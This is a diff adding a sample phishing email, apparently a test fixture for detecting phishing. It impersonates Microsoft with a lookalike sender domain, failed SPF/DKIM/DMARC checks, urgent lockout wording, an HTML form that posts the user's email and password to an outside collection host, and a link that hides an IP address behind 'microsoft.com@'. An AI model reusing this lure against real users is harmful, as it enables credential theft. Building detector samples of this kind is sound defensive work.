@@ -1,0 +1,16 @@
+From: Microsoft Account Team <security@micros0ft-login.example>
+To: Alex Morgan <alex@northwind.example>
+Date: Mon, 09 Nov 2026 10:21:00 +0000
+Subject: Urgent: account locked, verify now
+Return-Path: <bulk@send-service.example>
+Reply-To: <recovery@micros0ft-login.example>
+Authentication-Results: mx.example; spf=fail; dkim=fail; dmarc=fail
+MIME-Version: 1.0
+Content-Type: text/html; charset="utf-8"
+
+<p>Final notice. Your account is locked. Verify your identity immediately.</p>
+<form action="https://signin-microsoft.example/collect" method="post">
+  <input type="email" name="user"><input type="password" name="pass">
+  <button>Restore account</button>
+</form>
+<a href="https://microsoft.com@198.51.100.25/secure">Continue</a>
